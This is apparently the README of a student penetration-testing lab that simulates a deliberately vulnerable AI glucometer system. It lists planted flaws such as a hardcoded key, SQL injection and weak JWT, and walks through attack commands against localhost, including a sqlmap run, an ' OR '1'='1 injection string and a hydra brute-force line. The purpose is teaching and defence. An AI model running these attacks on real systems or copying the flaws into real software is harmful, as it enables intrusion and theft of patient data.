# Glucometer IIoT Security Lab

> ⚠️ **EDUCATIONAL DISCLAIMER**: This is a simulated vulnerable system created for ITAI 3377 coursework. It is NOT a real medical device. The vulnerabilities are intentional for penetration testing practice. Never use these techniques against real systems without authorization.

## Overview

This lab simulates an AI-integrated IIoT glucometer system with **intentional security vulnerabilities** that mirror real-world attack vectors. The goal is to practice penetration testing and validate defense strategies.

## Architecture

```
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│  Fake Sensor    │────▶│  Edge Gateway   │────▶│  Cloud API      │
│  (Python)       │     │  (FastAPI)      │     │  (FastAPI)      │
│                 │     │                 │     │                 │
│  Generates fake │     │  Forwards data  │     │  Stores data    │
│  glucose data   │     │  Has weak auth  │     │  Runs AI model  │
└─────────────────┘     └─────────────────┘     └─────────────────┘
```

## Intentional Vulnerabilities

| ID | Vulnerability | Location | Attack Vector |
|----|--------------|----------|---------------|
| V1 | Hardcoded API Key | Edge Gateway | Key extraction |
| V2 | No Input Validation | Cloud API | Injection attacks |
| V3 | Weak JWT Implementation | Auth endpoints | Token manipulation |
| V4 | SQL Injection | Database queries | SQLmap |
| V5 | No Rate Limiting | All endpoints | Brute force |
| V6 | Verbose Error Messages | Error handlers | Information disclosure |
| V7 | CORS Misconfiguration | Cloud API | Cross-origin attacks |

## Quick Start

### Prerequisites

- Python 3.8+
- pip

### Setup (Mac/Linux)

```bash
cd vulnerable-server
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
python app.py
```

### Setup (Windows)

```bash
cd vulnerable-server
python -m venv venv
venv\Scripts\activate
pip install -r requirements.txt
python app.py
```

### Setup (Kali Linux)

```bash
cd vulnerable-server
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
python3 app.py
```

Server runs on `http://localhost:8080`

## Attack Scenarios

### 1. Port Scanning (Kali: nmap)

```bash
nmap -sV -p 8080 localhost
```

### 2. SQL Injection (Kali: sqlmap)

```bash
sqlmap -u "http://localhost:8080/api/readings?patient_id=1" --dbs
```

### 3. API Fuzzing (Kali: burpsuite or curl)

```bash
# Test injection in patient_id
curl "http://localhost:8080/api/readings?patient_id=1' OR '1'='1"
```

### 4. Brute Force Auth (Kali: hydra)

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 8080 http-post-form "/api/login:username=^USER^&password=^PASS^:Invalid"
```

### 5. JWT Token Manipulation

```bash
# Decode the token, modify claims, re-encode with weak secret
python attacks/jwt_attack.py
```

### 6. Adversarial AI Input

```bash
# Send out-of-range glucose values to confuse the AI model
python attacks/adversarial_input.py
```

## Running Attacks (Python Scripts)

For those without Kali, use the Python attack scripts in `/attacks`:

```bash
cd attacks
python sql_injection.py
python jwt_attack.py
python adversarial_input.py
python brute_force.py
```

## Documenting Results

After each attack, document:

1. **Attack Type**: What vulnerability did you target?
2. **Tool Used**: Kali tool or Python script?
3. **Command/Code**: What did you run?
4. **Result**: Success or blocked?
5. **Evidence**: Screenshots or output logs
6. **Defense Recommendation**: How to fix it?

Use the template in `docs/attack-report-template.md`

## Team

- **Cassy Cormier**: System Design, Architecture, Pen Test Lead
- **Sufyan Rafiq**: Vulnerability Assessment
- **Kolapo Mogaji**: Defense Strategy
- **Monica Joya**: Implementation Plan, Integration

## Course Info

- **Course**: ITAI 3377 - IoT & Edge Computing
- **Assignment**: Midterm Project - Cybersecurity Plan for AI-Integrated IIoT System
- **Instructor**: Professor Sitaram Ayyagari
